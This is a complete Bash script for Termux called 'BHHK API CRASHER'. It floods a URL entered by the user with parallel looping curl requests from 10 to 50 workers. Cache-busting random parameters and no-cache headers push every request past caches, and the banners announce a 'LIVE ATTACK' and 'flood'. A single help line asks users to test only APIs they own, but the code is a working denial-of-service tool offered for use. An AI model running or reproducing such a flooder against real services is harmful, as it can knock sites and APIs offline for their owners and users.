#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
# BHHK API CRASHER — Main Engine
# ============================================================

# ============================================================
# COLORS
# ============================================================
CYAN='\033[0;36m'
PINK='\033[0;35m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
WHITE='\033[1;37m'
BLUE='\033[0;34m'
DIM='\033[2m'
BOLD='\033[1m'
NC='\033[0m'

# ============================================================
# GLOBAL STATE
# ============================================================
TARGET_URL=""
THREADS=10
TIMEOUT=8
TOTAL=0
OK=0
ERR=0
RUNNING=0
declare -a WORKER_PIDS
LOG_LINES=0
START_TIME=0

# ============================================================
# CURSOR / TERMINAL CONTROL
# ============================================================
hide_cursor() { printf '\033[?25l'; }
show_cursor() { printf '\033[?25h'; }
clear_line()  { printf '\r\033[K'; }

cleanup() {
    show_cursor
    printf '\n'
    if [ "$RUNNING" -eq 1 ]; then
        stop_workers
    fi
    echo -e "${YELLOW}  ⏹ Session ended${NC}"
    exit 0
}

trap cleanup INT TERM

# ============================================================
# BOOT BANNER
# ============================================================
show_banner() {
    clear
    echo ""
    echo -e "${CYAN}    ╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}    ║${NC}  ${PINK}⚡  B H H K   A P I   C R A S H E R  ⚡${NC}  ${CYAN}║${NC}"
    echo -e "${CYAN}    ║${NC}      ${DIM}BHHK TEAMS Stress Engine v1.0${NC}      ${CYAN}║${NC}"
    echo -e "${CYAN}    ╚══════════════════════════════════════════╝${NC}"
    echo ""

    # Animated scan line
    local frames=("▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱" "▰▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱" "▰▰▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱" \
             "▰▰▰▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱" "▰▰▰▰▰▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱" "▰▰▰▰▰▰▰▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱" \
             "▰▰▰▰▰▰▰▰▰▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱" "▰▰▰▰▰▰▰▰▰▰▰▱▱▱▱▱▱▱▱▱▱▱▱▱" "▰▰▰▰▰▰▰▰▰▰▰▰▰▱▱▱▱▱▱▱▱▱▱▱" \
             "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▱▱▱▱▱▱▱▱▱" "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▱▱▱▱▱▱▱" "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▱▱▱▱▱" \
             "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▱▱▱" "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▱" "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰")
    for f in "${frames[@]}"; do
        printf "\r  ${CYAN}${f}${NC}"
        sleep 0.04
    done
    echo ""
    echo ""
}

# ============================================================
# WORKER — fires requests in a loop
# ============================================================
worker_loop() {
    local worker_id=$1
    local url=$2
    local tmpfile="/tmp/bhhk_worker_${worker_id}_$$.log"

    while [ -f /tmp/bhhk_running_$$ ]; do
        local rnd=$(head /dev/urandom | tr -dc a-z0-9 | head -c 6)
        local sep="?"
        case "$url" in *\?*) sep="&";; esac
        local final_url="${url}${sep}_cb=${rnd}"

        local start_ms=$(date +%s%N)
        local http_code=$(curl -s -o /dev/null -w "%{http_code}" \
            --max-time "$TIMEOUT" \
            -A "Mozilla/5.0 (Linux; Android) BHHK/1.0" \
            -H "Cache-Control: no-cache" \
            -H "Pragma: no-cache" \
            "$final_url" 2>/dev/null)
        local end_ms=$(date +%s%N)
        local latency=$(( (end_ms - start_ms) / 1000000 ))

        # Atomic write to worker log
        if [ -z "$http_code" ] || [ "$http_code" = "000" ]; then
            echo "ERR|${worker_id}|${latency}|TIMEOUT" >> "$tmpfile"
        elif [ "$http_code" -ge 200 ] && [ "$http_code" -lt 400 ]; then
            echo "OK|${worker_id}|${latency}|${http_code}" >> "$tmpfile"
        else
            echo "ERR|${worker_id}|${latency}|${http_code}" >> "$tmpfile"
        fi
    done

    rm -f "$tmpfile" 2>/dev/null
}

# ============================================================
# LOG DISPLAY — reads from worker logs and prints
# ============================================================
log_tail() {
    local runtime=$1
    local last_total=0
    local rate=0
    local rate_timer=0

    while [ -f /tmp/bhhk_running_$$ ]; do
        # Read all worker logs
        local new_lines=0
        for logfile in /tmp/bhhk_worker_*_$$.log; do
            [ -f "$logfile" ] || continue
            if [ -s "$logfile" ]; then
                while IFS='|' read -r status wid latency code; do
                    [ -z "$status" ] && continue

                    TOTAL=$((TOTAL + 1))
                    local time_str=$(date +%H:%M:%S)

                    if [ "$status" = "OK" ]; then
                        OK=$((OK + 1))
                        printf "\r\033[K  ${DIM}${time_str}${NC} ${GREEN}[ OK ]${NC} ${WHITE}W%s${NC} ${DIM}→${NC} ${CYAN}%sms${NC} ${DIM}HTTP ${code}${NC}\n" \
                            "$wid" "$latency"
                    else
                        ERR=$((ERR + 1))
                        printf "\r\033[K  ${DIM}${time_str}${NC} ${RED}[FAIL]${NC} ${WHITE}W%s${NC} ${DIM}→${NC} ${YELLOW}%sms${NC} ${DIM}${code}${NC}\n" \
                            "$wid" "$latency"
                    fi
                    new_lines=$((new_lines + 1))
                done < "$logfile"
                # Truncate processed log
                > "$logfile"
            fi
        done

        # Update status bar
        if [ "$new_lines" -gt 0 ]; then
            LOG_LINES=$((LOG_LINES + new_lines))
            # Rate calculation
            rate_timer=$((rate_timer + 1))
            if [ "$rate_timer" -ge 5 ]; then
                rate=$((new_lines * 2))
                rate_timer=0
            fi
            update_status_bar "$rate"
        fi

        sleep 0.15
    done
}

# ============================================================
# STATUS BAR
# ============================================================
update_status_bar() {
    local rate=$1
    # Save cursor, move to line 7 (status bar row), draw, restore cursor
    printf "\033[s"
    printf "\033[7;1H\033[K"
    printf "  ${CYAN}▸${NC} ${GREEN}OK:${WHITE}%d${NC}  ${RED}ERR:${WHITE}%d${NC}  ${PINK}TOTAL:${WHITE}%d${NC}  ${CYAN}REQ/s:${WHITE}%d${NC}" \
        "$OK" "$ERR" "$TOTAL" "$rate"
    printf "\033[u"
}

# ============================================================
# START CRASHER
# ============================================================
start_crasher() {
    if [ "$RUNNING" -eq 1 ]; then
        echo -e "${YELLOW}  Already running${NC}"
        return
    fi

    echo ""
    echo -e "${CYAN}  ▸${NC} ${WHITE}Target URL:${NC}"
    printf "  ${PINK}➜${NC} "
    read -r TARGET_URL

    [ -z "$TARGET_URL" ] && { echo -e "${RED}  ✗ URL required${NC}"; return; }

    # Auto-prepend https
    case "$TARGET_URL" in
        http://*|https://*) ;;
        *) TARGET_URL="https://${TARGET_URL}" ;;
    esac

    echo ""
    echo -e "${CYAN}  ▸${NC} ${WHITE}Select threads:${NC}"
    echo -e "    ${PINK}[1]${NC} ${WHITE}10 threads${NC}   ${DIM}(light)${NC}"
    echo -e "    ${PINK}[2]${NC} ${WHITE}25 threads${NC}   ${DIM}(medium)${NC}"
    echo -e "    ${PINK}[3]${NC} ${WHITE}50 threads${NC}   ${DIM}(heavy)${NC}"
    printf "  ${PINK}➜${NC} "
    read -r th

    case "$th" in
        1) THREADS=10 ;;
        2) THREADS=25 ;;
        3) THREADS=50 ;;
        *) THREADS=10 ;;
    esac

    echo ""
    echo -e "${GREEN}  ✓${NC} ${WHITE}Starting flood...${NC}"
    echo ""

    # Init
    touch /tmp/bhhk_running_$$
    for i in $(seq 1 $THREADS); do
        : > /tmp/bhhk_worker_${i}_$$.log
    done

    RUNNING=1
    START_TIME=$(date +%s)

    hide_cursor

    # Layout: leave top 5 lines for header + status bar
    printf '\033[2J\033[H'
    echo ""
    echo -e "${CYAN}    ╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}    ║${NC}  ${PINK}⚡ BHHK API CRASHER — LIVE ATTACK ⚡${NC}    ${CYAN}║${NC}"
    echo -e "${CYAN}    ╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${CYAN}▸${NC} ${GREEN}OK:${WHITE}0${NC}  ${RED}ERR:${WHITE}0${NC}  ${PINK}TOTAL:${WHITE}0${NC}  ${CYAN}REQ/s:${WHITE}0${NC}"
    echo -e "  ${DIM}──────────────────────────────────────────${NC}"
    echo ""

    # Spawn workers
    WORKER_PIDS=()
    for i in $(seq 1 $THREADS); do
        worker_loop "$i" "$TARGET_URL" &
        WORKER_PIDS+=($!)
    done

    # Spawn log reader
    log_tail "$START_TIME" &
    local tail_pid=$!

    # Wait for Ctrl+C
    while [ "$RUNNING" -eq 1 ]; do
        sleep 1
    done

    # Cleanup
    kill $tail_pid 2>/dev/null
    rm -f /tmp/bhhk_running_$$

    # Drain workers
    sleep 0.5

    show_cursor
    echo ""
    echo ""
    echo -e "${CYAN}  ╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}  ║${NC}   ${YELLOW}⏹  ATTACK STOPPED${NC}                      ${CYAN}║${NC}"
    echo -e "${CYAN}  ╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${CYAN}▸${NC} ${GREEN}Success:${WHITE}  $OK${NC}"
    echo -e "  ${CYAN}▸${NC} ${RED}Failed:${WHITE}   $ERR${NC}"
    echo -e "  ${CYAN}▸${NC} ${PINK}Total:${WHITE}    $TOTAL${NC}"
    echo ""
}

# ============================================================
# STOP
# ============================================================
stop_workers() {
    RUNNING=0
    rm -f /tmp/bhhk_running_$$
    for pid in "${WORKER_PIDS[@]}"; do
        kill "$pid" 2>/dev/null
    done
    sleep 0.3
}

# ============================================================
# MAIN MENU
# ============================================================
main_menu() {
    while true; do
        show_banner

        echo -e "  ${CYAN}╭──────────────────────────────────────────╮${NC}"
        echo -e "  ${CYAN}│${NC}  ${PINK}[1]${NC} ${WHITE}⚡  START CRASHER${NC}                     ${CYAN}│${NC}"
        echo -e "  ${CYAN}│${NC}  ${PINK}[2]${NC} ${WHITE}📊  STATISTICS${NC}                        ${CYAN}│${NC}"
        echo -e "  ${CYAN}│${NC}  ${PINK}[3]${NC} ${WHITE}📖  HELP / INFO${NC}                       ${CYAN}│${NC}"
        echo -e "  ${CYAN}│${NC}  ${PINK}[0]${NC} ${WHITE}🚪  EXIT${NC}                              ${CYAN}│${NC}"
        echo -e "  ${CYAN}╰──────────────────────────────────────────╯${NC}"
        echo ""
        printf "  ${PINK}➜${NC} ${WHITE}Select option:${NC} "
        read -r choice

        case "$choice" in
            1) start_crasher ;;
            2) show_stats ;;
            3) show_help ;;
            0) cleanup ;;
            *) echo -e "${RED}  ✗ Invalid option${NC}"; sleep 1 ;;
        esac

        [ "$choice" != "1" ] && [ "$choice" != "2" ] && [ "$choice" != "3" ] && [ "$choice" != "0" ] && continue
        [ "$choice" != "1" ] && {
            echo ""
            printf "  ${DIM}Press ENTER to continue...${NC}"
            read -r
        }
    done
}

# ============================================================
# STATISTICS
# ============================================================
show_stats() {
    show_banner
    echo -e "  ${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "  ${CYAN}║${NC}   ${PINK}📊 SESSION STATISTICS${NC}                  ${CYAN}║${NC}"
    echo -e "  ${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${CYAN}▸${NC} ${WHITE}Target:${NC}    ${PINK}${TARGET_URL:-N/A}${NC}"
    echo -e "  ${CYAN}▸${NC} ${WHITE}Threads:${NC}   ${PINK}${THREADS}${NC}"
    echo -e "  ${CYAN}▸${NC} ${GREEN}Success:${NC}   ${WHITE}${OK}${NC}"
    echo -e "  ${CYAN}▸${NC} ${RED}Failed:${NC}    ${WHITE}${ERR}${NC}"
    echo -e "  ${CYAN}▸${NC} ${PINK}Total:${NC}     ${WHITE}${TOTAL}${NC}"
    echo ""
    local uptime=$(( $(date +%s) - START_TIME ))
    [ "$START_TIME" -eq 0 ] && uptime=0
    echo -e "  ${CYAN}▸${NC} ${WHITE}Uptime:${NC}    ${PINK}${uptime}s${NC}"
    echo ""
    if [ "$TOTAL" -gt 0 ]; then
        local rate=$(( OK * 100 / TOTAL ))
        echo -e "  ${CYAN}▸${NC} ${WHITE}Success rate:${NC} ${GREEN}${rate}%${NC}"
    fi
    echo ""
}

# ============================================================
# HELP
# ============================================================
show_help() {
    show_banner
    echo -e "  ${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "  ${CYAN}║${NC}   ${PINK}📖 HELP / INFO${NC}                        ${CYAN}║${NC}"
    echo -e "  ${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${WHITE}${BOLD}How to use:${NC}"
    echo -e "  ${CYAN}1.${NC} Choose ${PINK}START CRASHER${NC} from menu"
    echo -e "  ${CYAN}2.${NC} Enter target API URL"
    echo -e "  ${CYAN}3.${NC} Select thread count (10/25/50)"
    echo -e "  ${CYAN}4.${NC} Watch live log in real-time"
    echo -e "  ${CYAN}5.${NC} Press ${PINK}Ctrl+C${NC} to stop"
    echo ""
    echo -e "  ${WHITE}${BOLD}Thread Guide:${NC}"
    echo -e "  ${CYAN}▸${NC} ${WHITE}10 threads${NC}  — Light load, safe for testing"
    echo -e "  ${CYAN}▸${NC} ${WHITE}25 threads${NC}  — Medium load"
    echo -e "  ${CYAN}▸${NC} ${WHITE}50 threads${NC}  — Heavy load"
    echo ""
    echo -e "  ${WHITE}${BOLD}Requirements:${NC}"
    echo -e "  ${CYAN}▸${NC} curl (installed via pkg)"
    echo -e "  ${CYAN}▸${NC} Active internet connection"
    echo -e "  ${CYAN}▸${NC} Termux environment"
    echo ""
    echo -e "  ${YELLOW}⚠  Only test APIs you own or have permission for${NC}"
    echo ""
}

# ============================================================
# ENTRY
# ============================================================
show_banner
sleep 0.6
main_menu